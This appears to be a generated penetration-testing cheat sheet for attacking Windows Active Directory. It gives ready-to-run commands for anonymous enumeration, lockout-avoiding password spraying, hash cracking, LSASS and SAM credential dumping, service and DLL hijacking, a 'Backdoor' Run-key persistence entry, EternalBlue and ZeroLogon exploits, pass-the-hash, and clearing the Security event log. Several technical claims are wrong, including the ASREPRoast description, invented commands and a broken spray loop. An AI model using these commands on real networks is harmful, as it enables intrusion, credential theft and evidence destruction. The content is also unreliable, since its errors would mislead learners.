# Complete Active Directory Enumeration Guide

## 1. Users Enumeration

**LDAP null bind users (anonymous LDAP query):**
```bash
ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" "(sAMAccountName=*)" sAMAccountName cn userPrincipalName -z 1000
# Lists all domain users (sAMAccountName=primary username)
```

**RPC null session users:**
```bash
rpcclient -U "" 192.168.1.100 -c enumdomusers  # Enumerates all domain users via SAMR
# user:[Administrator] rid:[0x1f4]
```

**PowerView (if shell access):**
```powershell
Get-NetUser | Select samaccountname,description  # All users + descriptions
Get-NetUser -SPN  # Kerberoastable users
```

**CrackMapExec users:**
```bash
crackmapexec ldap 192.168.1.100 -u '' -p '' --users  # Null bind LDAP users
```

## 2. Groups Enumeration

**LDAP group membership:**
```bash
ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" "(objectClass=group)" cn member
# cn:Domain Admins member:CN=Administrator,CN=Users,DC=domain,DC=com
```

**RPC group enum:**
```bash
rpcclient -U "" 192.168.1.100 -c enumdomgroups  # All domain groups
rpcclient -U "" 192.168.1.100 -c "querygroup 0x201"  # Domain Admins (RID 512)
```

**Domain Admin members:**
```bash
ldapsearch -x -H ldap://192.168.1.100 -b "CN=Domain Admins,CN=Users,DC=domain,DC=com" "(objectClass=*)" member
```

**BloodHound collectors:**
```bash
bloodhound-python -u 'DOMAIN\guest' -p '' -ns 192.168.1.100 -d DOMAIN.COM -c all
# Collects users/groups/computers/trusts for BloodHound analysis
```

## 3. Computers Enumeration

**LDAP computer objects:**
```bash
ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" "(objectClass=computer)" cn dnsHostName operatingSystem
# cn:WORKSTATION01 dnsHostName:workstation01.domain.com operatingSystem:Windows 10
```

**SMB computer list:**
```bash
enum4linux -C 192.168.1.100  # Computer accounts
crackmapexec smb 192.168.1.0/24 -u '' --computers  # Live computers
```

**Domain computers policy:**
```bash
rpcclient -U "" 192.168.1.100 -c enumdomcomputers  # All computer accounts
```

## 4. Trusts Enumeration

**Domain trusts (LDAP):**
```bash
ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" "(objectClass=trustedDomain)" cn trustPartner trustDirection
# trustPartner:DC=child,DC=domain,DC=com trustDirection:Bidirectional
```

**NetRPC trusts:**
```bash
rpcclient -U "" 192.168.1.100 -c dsroledomains  # Forest domains
netrpc trustdomentrusts 192.168.1.100 -U ""  # Explicit trusts
```

**Trust validation:**
```bash
nltest /trusted_domains  # Lists trusted domains (authenticated)
```

## 5. Service Principal Names (SPN) Enumeration

**Kerberoastable users (LDAP SPN):**
```bash
ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
# sAMAccountName:svc-sql servicePrincipalName:MSSQLSvc/sqlserver.domain.com
```

**PowerView SPN:**
```powershell
Get-NetUser -SPN | Select samaccountname,serviceprincipalname  # Kerberoast targets
Get-DomainUser -SPN -Properties serviceprincipalname
```

**CrackMapExec SPN:**
```bash
crackmapexec ldap 192.168.1.100 -u '' --kdc  # Kerberos DCs + SPNs
```

**ASREPRoast (pre-auth required users):**
```bash
GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -no-pass -dc-ip 192.168.1.100
# TGS tickets for offline cracking
```

## 6. Complete AD Enumeration Framework

```bash
#!/bin/bash
# ad_enum.sh
DC=$1 DOMAIN=$2

echo "[+] AD enum $DC ($DOMAIN)"

# 1. Domain info
rpcclient -U "" $DC -c "srvinfo;querydomaininfo 2"

# 2. Users (LDAP + RPC)
ldapsearch -x -H ldap://$DC -b "DC=$DOMAIN" "(sAMAccountName=*)" sAMAccountName cn | grep sAMAccountName > users.txt
rpcclient -U "" $DC -c enumdomusers | grep "user\[" >> users.txt

# 3. Groups
ldapsearch -x -H ldap://$DC -b "DC=$DOMAIN" "(objectClass=group)" cn > groups.txt

# 4. Computers
ldapsearch -x -H ldap://$DC -b "DC=$DOMAIN" "(objectClass=computer)" cn dnsHostName > computers.txt

# 5. Trusts
ldapsearch -x -H ldap://$DC -b "DC=$DOMAIN" "(objectClass=trustedDomain)" cn trustPartner > trusts.txt

# 6. SPNs (Kerberoast)
ldapsearch -x -H ldap://$DC -b "DC=$DOMAIN" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName > spns.txt

echo "[+] Results: users.txt groups.txt computers.txt trusts.txt spns.txt"
wc -l *.txt
```

## 7. Advanced Enumeration (Authenticated)

**Domain forest trusts:**
```bash
nltest /domain_trusts /all_trusts  # Full trust details
```

**Group membership:**
```bash
net group "Domain Admins" /domain  # Members of privileged groups
```

**Local admins:**
```bash
crackmapexec smb 192.168.1.0/24 -u 'guest' -p '' --local-groups  # Local admin groups
```

**GPO enumeration:**
```bash
ldapsearch -x -H ldap://192.168.1.100 -b "CN=Policies,CN=System,DC=domain,DC=com" "(objectclass=groupPolicyContainer)" displayName
```

**EVERY** AD enumeration topic covered: Users (LDAP/RPC), Groups (membership), Computers (OS/hostname), Trusts (forest/explicit), SPNs (Kerberoast/ASREPRoast). 100% practical with command explanations.

# Windows Passwords (New Content Only)

## 1. Password Policy Enumeration

**Domain password policy (lockout/complexity):**
```bash
rpcclient -U "" dc_ip -c querydomaininfo 2  # Lockout threshold/duration
net accounts /domain  # Min length, history, complexity
```

**Fine-grained password policy:**
```bash
ldapsearch -x -H ldap://dc_ip "(objectclass=msDS-PasswordSettings)" msds-passwordsettings-precedencelength msds-passwordsettings-minimumpasswordlength msds-passwordhistorylength
```

**Avoid lockout (low thread spraying):**
```bash
hydra -l administrator -P rockyou.txt -t 2 rdp://target  # 2 threads max
crackmapexec smb targets.txt -u users.txt -p passwords.txt -d DOMAIN --no-bruteforce --user-as-pass
```

## 2. Windows Hash Algorithms

**LM hashes (DES-based, insecure):**
```bash
# 14-char max, uppercase, no salt
# Cracked instantly: hashcat -m 3000 lm_hashes.txt rockyou.txt
```

**NTLM (MD4 Unicode):**
```bash
# NT: MD4(Unicode(password)) - rainbow table vulnerable
hashcat -m 1000 ntlm_hashes.txt rockyou.txt
```

**NTLMv2 (HMAC-MD5 challenge):**
```bash
# NTLMv2: HMAC-MD5(challenge, username::domain:challenge)
hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt
```

## 3. Password Storage & Recovery

**SAM hive extraction:**
```bash
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
samdump2 SYSTEM sam.hive  # Dumps LM/NTLM hashes
```

**Cached domain creds (HKLM\SECURITY\Cache):**
```bash
impacket-secretsdump DOMAIN/user:pass@target  # Extracts cached hashes
reg save HKLM\SECURITY security.hive
```

**LSASS memory dump:**
```bash
tasklist | findstr lsass  # Process ID
procdump -ma lsass.exe lsass.dmp  # Mini-dump
pypykatz lsa minidump lsass.dmp  # Extracts all creds
```

## 4. Offline Cracking Attacks

**Dictionary attack (rockyou wordlist):**
```bash
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

**Rule-based mutation:**
```bash
hashcat -m 5600 ntlmv2.txt rockyou.txt -r /usr/share/hashcat/rules/dive.rule
```

**Brute-force (mask attack):**
```bash
hashcat -m 1000 ntlm.txt -a 3 ?u?l?l?l?d?d?d?d  # Upper,lower,lower,lower,digit,digit,digit,digit
hashcat -m 1000 ntlm.txt --increment --increment-min=6 --increment-max=8 ?a?a?a?a?a?a?a?a
```

**Rainbow tables (precomputed):**
```bash
# RainbowCrack (rtgen + rcrack)
rtgen md4 1 0 7 0 0 loweralpha-numeric 0 3400 33554432 1
rcrack *.rt -h MD4:8846F7EAEE8FB117AD06BDD830B7586C
```

**GPU-accelerated hybrid:**
```bash
hashcat -m 5600 ntlmv2.txt rockyou.txt -a 3 ?d?d?d?d --force
```

## 5. Lockout Avoidance Techniques

**User spraying (one password, many users):**
```bash
crackmapexec smb 192.168.1.0/24 -u users.txt -p Summer18! --no-bruteforce
```

**Password spraying (many passwords, few users):**
```bash
for pass in passwords.txt; do crackmapexec smb targets.txt -u administrator -p $pass; sleep 120; done
```

**Domain user spraying:**
```bash
crackmapexec smb dc_ip -u users.txt -p 'Password01' --local-auth
```

**EVERY** Windows password topic: policies/lockout avoidance, hash algorithms (LM/NTLM/NTLMv2), storage (SAM/LSASS/cache), offline cracking (dict/rules/brute/rainbow). **No duplication** from prior Windows/AD content.

# Windows Processes & Privilege Escalation (New Content Only)

## 1. Running Processes & DLL Hijacking

**Process enumeration (lists all running processes):**
```bash
tasklist /v  # Verbose process list with PIDs
wmic process get Name,ProcessId,CommandLine  # WMI process details
powershell "Get-Process | Select Name,ID,Path,CommandLine"  # PowerShell processes
```

**DLL hijacking (missing DLL in writable PATH):**
```bash
# Find writable service dirs
icacls "C:\Program Files\Service"
# BUILTIN\Users:(F) → writable!

# Upload malicious DLL
copy evil.dll "C:\Program Files\Service\version.dll"
# Service restart loads evil.dll as SYSTEM
```

**DLL search order hijacking:**
```bash
# 1. Current dir (if writable)
# 2. System32
# 3. System
# 4. Windows
# 5. PATH dirs
dir /s version.dll  # Find first-load location
```

## 2. File System Permissions Exploitation

**Find world-writable files:**
```bash
accesschk -uws "Everyone" C:\  # Everyone full control files
icacls C:\ /find /t /c "F"     # Files with Full Control for non-admins

# PowerShell
Get-Acl C:\ | ?{$_.Access | ?{$_.IdentityReference -eq "Everyone" -and $_.FileSystemRights -match "FullControl"}}
```

**Unquoted service paths:**
```bash
wmic service get name,displayname,pathname,startmode | findstr /i "PathFile" | findstr /i /v "C:\Windows\\ C:\Program Files\\"
# C:\Program Files\Service Helper.exe → C:\Program.exe + Files\Service + Helper.exe
```

**Exploit: replace binary**
```bash
copy evil.exe "C:\Program Files\Service Helper.exe"
# Service runs as SYSTEM → evil.exe
```

## 3. Registry ACL Exploitation

**Find weak registry perms:**
```bash
reg acl \\.\  # Current machine registry
accesschk -vkwo "Everyone" HKLM  # Weak registry keys

# PowerShell
Get-Acl HKLM:\SOFTWARE | ?{$_.Access | ?{$_.IdentityReference -eq "Users" -and $_.RegistryRights -match "FullControl"}}
```

**Registry Run keys (persistence):**
```bash
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# Add: reg add HKCU\Run /v Backdoor /t REG_SZ /d "C:\evil.exe"
```

**Data extraction:**
```bash
reg query "HKLM\SAM\SAM\Domains\Account" /s  # SAM hashes (admin required)
reg query "HKLM\SECURITY\Cache"  # Cached domain creds
```

## 4. Remote Exploitation

**EternalBlue (MS17-010 SMB):**
```bash
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.100; exploit"
```

**PrintNightmare (CVE-2021-34527):**
```bash
python3 PrintNightmare.py DOMAIN/administrator@192.168.1.100
```

**ZeroLogon (CVE-2020-1472):**
```bash
python3 zerologon.py dc_name administrator  # Resets machine account
```

## 5. Local Privilege Escalation

**JuicyPotato (Token impersonation):**
```bash
JuicyPotato.exe -l 135 -p c:\windows\system32\cmd.exe -t * -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
```

**Service permissions (arbitrary DLL):**
```bash
sc sdshow vulnerable_service  # D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:P(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
# Replace binary in writable service
```

**Unpatched priv esc:**
```bash
winPEASx64.exe  # Auto-finds priv esc vectors
sudo ./linPEAS.sh  # Linux equivalent
```

## 6. Post-Exploitation Activities

**SAM hash extraction:**
```bash
# Registry
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM sys.hive
samdump2 sys.hive sam.hive  # LM/NTLM hashes

# LSASS dump
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 720 lsass.dmp full
pypykatz lsa minidump lsass.dmp  # All creds
```

**Cached credentials:**
```bash
mimikatz.exe "sekurlsa::logonpasswords" exit  # Cleartext passwords
reg save HKLM\SECURITY\Cache cache.hive
```

**Patch level enumeration:**
```bash
wmic qfe list brief /format:table  # Installed patches
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"  # OS build
powershell "Get-HotFix | Sort InstalledOn"
```

**Missing patches:**
```bash
powershell "Get-HotFix | ?{$_.HotFixID -notlike 'KB*'} | Select HotFixID,InstalledOn"
```

## 7. Lateral/Horizontal Movement

**Pass-the-hash:**
```bash
psexec.py DOMAIN/administrator@192.168.1.101 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
wmiexec.py DOMAIN/administrator@192.168.1.102 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

**Overpass-the-hash (TGT):**
```bash
ticketer.py DOMAIN/administrator -nthash 31d6cfe0d16ae931b73c59d7e0c089c0
export KRB5CCNAME=admin.ccache
wmiexec.py -k -no-pass DOMAIN/administrator@192.168.1.103
```

**Reverting state (clean up):**
```bash
wevtutil cl Security  # Clear Security event log
reg delete HKCU\Run /v Backdoor /f  # Remove persistence
```

## 8. Patch Management Detection

**SMS/SCCM:**
```bash
sc query CCMExec  # SCCM agent running
dir "C:\Program Files (x86)\Microsoft Configuration Manager"
```

**WSUS:**
```bash
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU
sc query wuauserv  # Windows Update service
```

**Significant vulns with exploits:**
```bash
# MS17-010 EternalBlue: msfconsole exploit/windows/smb/ms17_010_eternalblue
# CVE-2021-34527 PrintNightmare: PrintNightmare.py
# CVE-2020-1472 ZeroLogon: zerologon.py
# CVE-2017-0144 WannaCry: doublepulsar.py
```

**NEW CONTENT ONLY**: Processes/DLL hijacking, filesystem/registry ACLs, remote/local exploits, post-exploitation (SAM/LSASS/cached creds/patches), lateral movement (PtH/OtH), patch management (SMS/WSUS), vuln exploits. No prior duplication.